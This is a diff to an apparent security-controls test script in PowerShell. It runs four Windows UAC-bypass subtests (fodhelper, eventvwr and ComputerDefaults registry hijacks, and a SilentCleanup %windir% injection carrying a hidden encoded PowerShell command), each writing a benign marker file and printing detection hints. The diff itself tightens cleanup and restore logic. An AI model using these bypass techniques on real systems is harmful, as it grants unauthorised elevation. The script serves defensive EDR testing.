@@ -27,13 +27,13 @@
     Subtest 4 (SilentCleanup)   - DiskCleanup scheduled task + %%windir%% env-var
                                      injection. The SilentCleanup task runs elevated for
                                      the current user. It executes %%windir%%\system32\
-                                     cleanmgr.exe; overriding %%windir%% in the process
-                                     environment redirects that to our payload.
-                                     No registry keys written - different detection surface.
+                                     cleanmgr.exe; overriding the current user's %%windir%%
+                                     environment value redirects that to our payload.
+                                     The original value is restored immediately.
 
     All subtests write a marker file to C:\Windows\Temp\ as proof-of-execution.
-    Writing to C:\Windows\Temp requires admin rights; a successful bypass means the
-    marker appears, a blocked bypass means it does not.
+    A marker proves that the payload ran, but a missing marker alone does not prove
+    that a security control blocked the bypass.
     Nothing malicious runs - benign file writes only.
     All registry / environment changes are restored after each subtest.
 
@@ -57,6 +57,9 @@ param(
 $tempDir        = "C:\Windows\Temp"
 $mssettingsPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
 $mscfilePath    = "HKCU:\Software\Classes\mscfile\shell\open\command"
+$userEnvironmentPath = "HKCU:\Environment"
+$registryOwnerName  = 'SCTOwner'
+$registryOwnerValue = 'SecurityControlsTesting-v3.2'
 
 # ==============================================================================
 # HELPERS
@@ -77,12 +80,10 @@ function Get-EncodedCommand {
 
 function Test-IsHighIntegrity {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $integritySid = @($identity.Groups | ForEach-Object { $_.Value } |
-        Where-Object { $_ -match '^S-1-16-\d+$' } | Select-Object -First 1)
-    if ($integritySid.Count -eq 0) { return $false }
-
-    $integrityLevel = [int]($integritySid[0] -split '-')[-1]
-    return $integrityLevel -ge 12288 # High, System, or Protected Process
+    $principal = New-Object -TypeName Security.Principal.WindowsPrincipal -ArgumentList $identity
+    # With UAC enabled, an administrator's Medium-integrity token does not have
+    # the Administrator SID enabled; the elevated token does.
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
 function Initialize-TestMarker {
@@ -113,14 +114,57 @@ function Test-ExecutionResult {
     return $false
 }
 
+function New-SCTRegistryHijack {
+    param(
+        [Parameter(Mandatory)][string]$Path,
+        [Parameter(Mandatory)][string]$Payload,
+        [switch]$IncludeDelegateExecute
+    )
+
+    if (Test-Path -LiteralPath $Path) {
+        throw "Refusing to overwrite an existing per-user class override: $Path"
+    }
+
+    New-Item -Path $Path -Force -ErrorAction Stop | Out-Null
+    try {
+        New-ItemProperty -Path $Path -Name $registryOwnerName -Value $registryOwnerValue `
+            -PropertyType String -Force -ErrorAction Stop | Out-Null
+        Set-ItemProperty -Path $Path -Name '(default)' -Value $Payload -ErrorAction Stop
+        if ($IncludeDelegateExecute) {
+            New-ItemProperty -Path $Path -Name 'DelegateExecute' -Value '' `
+                -PropertyType String -Force -ErrorAction Stop | Out-Null
+        }
+    } catch {
+        # This path did not exist before the function started, so it is safe to
+        # remove if initialization only partially completed.
+        Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue
+        throw
+    }
+}
+
+function Remove-SCTRegistryHijack {
+    param([Parameter(Mandatory)][string]$Path)
+
+    if (-not (Test-Path -LiteralPath $Path)) {
+        return
+    }
+
+    $owner = Get-ItemPropertyValue -LiteralPath $Path -Name $registryOwnerName -ErrorAction SilentlyContinue
+    if ($owner -eq $registryOwnerValue) {
+        Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue
+        return
+    }
+
+    Write-Host "[!] Preserving registry key not owned by SCT: $Path" -ForegroundColor Yellow
+}
+
 function Invoke-Cleanup {
     param([string[]]$Names)
     foreach ($n in $Names) {
         Remove-Item "$tempDir\art-v3.2-$n.txt" -Force -ErrorAction Ignore
     }
-    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
-    Remove-Item "HKCU:\Software\Classes\mscfile"     -Recurse -Force -ErrorAction Ignore
-    Remove-Item "$env:TEMP\sct-silentcleanup.bat"    -Force -ErrorAction Ignore
+    Remove-SCTRegistryHijack -Path $mssettingsPath
+    Remove-SCTRegistryHijack -Path $mscfilePath
     Write-Host "[+] Cleanup complete" -ForegroundColor Green
 }
 
@@ -154,9 +198,7 @@ function Test-Fodhelper {
     Write-Host "    DelegateExecute= (empty string - required to activate lookup)" -ForegroundColor DarkGray
     Write-Host "    [Detection: Sysmon 13 - RegistryEvent on ms-settings\shell\open\command]" -ForegroundColor DarkGray
     try {
-        New-Item -Path $mssettingsPath -Force | Out-Null
-        Set-ItemProperty  -Path $mssettingsPath -Name "(default)"      -Value $payload   -ErrorAction Stop
-        New-ItemProperty  -Path $mssettingsPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
+        New-SCTRegistryHijack -Path $mssettingsPath -Payload $payload -IncludeDelegateExecute
         Write-Host "    Registry key written." -ForegroundColor Green
     } catch {
         Write-Host "  RESULT: Registry write blocked - $($_.Exception.Message)" -ForegroundColor Green
@@ -169,15 +211,15 @@ function Test-Fodhelper {
         Start-Process "C:\Windows\System32\fodhelper.exe" -ErrorAction Stop
     } catch {
         Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
-        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
+        Remove-SCTRegistryHijack -Path $mssettingsPath
         return $false
     }
 
     $result = Test-ExecutionResult -Name "Fodhelper"
 
     Write-Host "`n[*] Removing ms-settings registry key..." -ForegroundColor Yellow
-    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
-    Write-Host "    Registry key removed." -ForegroundColor DarkGray
+    Remove-SCTRegistryHijack -Path $mssettingsPath
+    Write-Host "    SCT-owned command key removed." -ForegroundColor DarkGray
 
     return $result
 }
@@ -212,8 +254,7 @@ function Test-Eventvwr {
     Write-Host "    (default) = powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [b64]" -ForegroundColor DarkGray
     Write-Host "    [Detection: Sysmon 13 - RegistryEvent on mscfile\shell\open\command]" -ForegroundColor DarkGray
     try {
-        New-Item -Path $mscfilePath -Force | Out-Null
-        Set-ItemProperty -Path $mscfilePath -Name "(default)" -Value $payload -ErrorAction Stop
+        New-SCTRegistryHijack -Path $mscfilePath -Payload $payload
         Write-Host "    Registry key written." -ForegroundColor Green
     } catch {
         Write-Host "  RESULT: Registry write blocked - $($_.Exception.Message)" -ForegroundColor Green
@@ -226,15 +267,15 @@ function Test-Eventvwr {
         Start-Process "C:\Windows\System32\eventvwr.exe" -ErrorAction Stop
     } catch {
         Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
-        Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
+        Remove-SCTRegistryHijack -Path $mscfilePath
         return $false
     }
 
     $result = Test-ExecutionResult -Name "Eventvwr"
 
     Write-Host "`n[*] Removing mscfile registry key..." -ForegroundColor Yellow
-    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
-    Write-Host "    Registry key removed." -ForegroundColor DarkGray
+    Remove-SCTRegistryHijack -Path $mscfilePath
+    Write-Host "    SCT-owned command key removed." -ForegroundColor DarkGray
 
     return $result
 }
@@ -269,9 +310,7 @@ function Test-ComputerDefaults {
     Write-Host "    DelegateExecute = (empty string)" -ForegroundColor DarkGray
     Write-Host "    [Detection: Sysmon 13 - RegistryEvent on ms-settings\shell\open\command]" -ForegroundColor DarkGray
     try {
-        New-Item -Path $mssettingsPath -Force | Out-Null
-        Set-ItemProperty  -Path $mssettingsPath -Name "(default)"       -Value $payload -ErrorAction Stop
-        New-ItemProperty  -Path $mssettingsPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
+        New-SCTRegistryHijack -Path $mssettingsPath -Payload $payload -IncludeDelegateExecute
         Write-Host "    Registry key written." -ForegroundColor Green
     } catch {
         Write-Host "  RESULT: Registry write blocked - $($_.Exception.Message)" -ForegroundColor Green
@@ -284,15 +323,15 @@ function Test-ComputerDefaults {
         Start-Process "C:\Windows\System32\ComputerDefaults.exe" -ErrorAction Stop
     } catch {
         Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
-        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
+        Remove-SCTRegistryHijack -Path $mssettingsPath
         return $false
     }
 
     $result = Test-ExecutionResult -Name "ComputerDefaults"
 
     Write-Host "`n[*] Removing ms-settings registry key..." -ForegroundColor Yellow
-    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
-    Write-Host "    Registry key removed." -ForegroundColor DarkGray
+    Remove-SCTRegistryHijack -Path $mssettingsPath
+    Write-Host "    SCT-owned command key removed." -ForegroundColor DarkGray
 
     return $result
 }
@@ -311,13 +350,14 @@ function Test-SilentCleanup {
     Write-Host "         Overriding %%windir%% in the process environment before triggering"
     Write-Host "         the task redirects path resolution so the action becomes:"
     Write-Host "           cmd /c <payload> &REM\system32\cleanmgr.exe /autoclean /d c:"
-    Write-Host "         No registry keys written. Different detection surface from tests 1-3."
-    Write-Host "         %%windir%% is restored immediately after the task is triggered."
+    Write-Host "         The current-user %%windir%% environment value is stored under HKCU."
+    Write-Host "         Its original state is restored immediately after the task is triggered."
     Write-Host "`nDetection:"
     Write-Host "  Sysmon 1   - schtasks.exe /Run /TN SilentCleanup; unusual child of task host"
     Write-Host "  EDR alert  - SilentCleanup task spawning non-cleanmgr.exe child at High integrity"
     Write-Host "  SIEM rule  - Process create: task=SilentCleanup; child!=cleanmgr.exe"
-    Write-Host "  Hunt       - Unusual %%windir%% env value in process that triggers schtasks"
+    Write-Host "  Sysmon 13  - RegistryEvent: HKCU\Environment\windir modified"
+    Write-Host "  Hunt       - Unusual current-user %%windir%% environment value"
 
     $marker      = Initialize-TestMarker -Name 'SilentCleanup'
     $cmd         = "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] SilentCleanup UAC bypass executed')"
@@ -326,33 +366,43 @@ function Test-SilentCleanup {
     # '& REM' terminates the payload command; REM comments out the cleanmgr path remainder.
     $hijackedDir = "cmd /c powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded & REM"
 
-    Write-Host "`n[*] Reading current %%windir%% for restore..." -ForegroundColor Yellow
-    $savedWinDir = $env:windir
-    Write-Host "    Current: $savedWinDir" -ForegroundColor DarkGray
+    Write-Host "`n[*] Reading current-user %%windir%% value for restore..." -ForegroundColor Yellow
+    $windirProperty = Get-ItemProperty -Path $userEnvironmentPath -Name 'windir' -ErrorAction SilentlyContinue
+    $hadUserWinDir = $null -ne $windirProperty -and $null -ne $windirProperty.PSObject.Properties['windir']
+    $savedUserWinDir = if ($hadUserWinDir) { [string]$windirProperty.windir } else { $null }
+    Write-Host "    Current user value: $(if ($hadUserWinDir) { $savedUserWinDir } else { '<not set>' })" -ForegroundColor DarkGray
 
-    Write-Host "`n[*] Overriding %%windir%% in current process environment..." -ForegroundColor Yellow
+    Write-Host "`n[*] Overriding the current-user %%windir%% environment value..." -ForegroundColor Yellow
     Write-Host "    New %%windir%%: cmd /c powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [b64] & REM" -ForegroundColor DarkGray
     Write-Host "    Task action expands to: <payload> & REM\system32\cleanmgr.exe /autoclean /d c:" -ForegroundColor DarkGray
     Write-Host "    cmd.exe splits on '&': payload runs first; 'REM\system32\...' is a no-op comment." -ForegroundColor DarkGray
-    Write-Host "    [Detection: unusual %%windir%% value in process env before schtasks call]" -ForegroundColor DarkGray
-    $env:windir = $hijackedDir
+    Write-Host "    [Detection: Sysmon 13 - RegistryEvent on HKCU\Environment\windir]" -ForegroundColor DarkGray
 
-    Write-Host "`n[*] Triggering SilentCleanup task (inherits modified process environment)..." -ForegroundColor Yellow
-    Write-Host "    Command: schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup" -ForegroundColor DarkGray
-    Write-Host "    [Detection: Sysmon 1 - SilentCleanup task host spawning powershell.exe at High integrity]" -ForegroundColor DarkGray
+    $windirChanged = $false
+    $result = $false
     try {
+        [Environment]::SetEnvironmentVariable('windir', $hijackedDir, [EnvironmentVariableTarget]::User)
+        $windirChanged = $true
+
+        Write-Host "`n[*] Triggering SilentCleanup task..." -ForegroundColor Yellow
+        Write-Host "    Command: schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup" -ForegroundColor DarkGray
+        Write-Host "    [Detection: Sysmon 1 - SilentCleanup task host spawning powershell.exe at High integrity]" -ForegroundColor DarkGray
         Start-Process schtasks.exe -ArgumentList @("/Run", "/TN", "\Microsoft\Windows\DiskCleanup\SilentCleanup") -Wait -ErrorAction Stop
+        $result = Test-ExecutionResult -Name "SilentCleanup"
     } catch {
         Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
-        $env:windir = $savedWinDir
-        return $false
+    } finally {
+        if ($windirChanged) {
+            if ($hadUserWinDir) {
+                [Environment]::SetEnvironmentVariable('windir', $savedUserWinDir, [EnvironmentVariableTarget]::User)
+            } else {
+                [Environment]::SetEnvironmentVariable('windir', $null, [EnvironmentVariableTarget]::User)
+            }
+            Write-Host "    Current-user %%windir%% value restored." -ForegroundColor DarkGray
+        }
     }
 
-    # Restore windir before checking result - task has already been triggered
-    $env:windir = $savedWinDir
-    Write-Host "    %%windir%% restored to: $savedWinDir" -ForegroundColor DarkGray
-
-    return (Test-ExecutionResult -Name "SilentCleanup")
+    return $result
 }
 
 # ==============================================================================
@@ -433,8 +483,10 @@ switch ($Subtest) {
         Write-Host "+==============================================================================+" -ForegroundColor Cyan
         Write-Host "|   SINGLE SUBTEST: $Subtest" -ForegroundColor Cyan
         Write-Host "+==============================================================================+" -ForegroundColor Cyan
-        Write-Host "`n[!] Have EDR/AV console visible before proceeding." -ForegroundColor Yellow
-        Read-Host "    Press Enter to start"
+        if (-not $NoPause) {
+            Write-Host "`n[!] Have EDR/AV console visible before proceeding." -ForegroundColor Yellow
+            [void](Read-Host "    Press Enter to start")
+        }
 
         $success = switch ($Subtest) {
             'Fodhelper'        { Test-Fodhelper        }
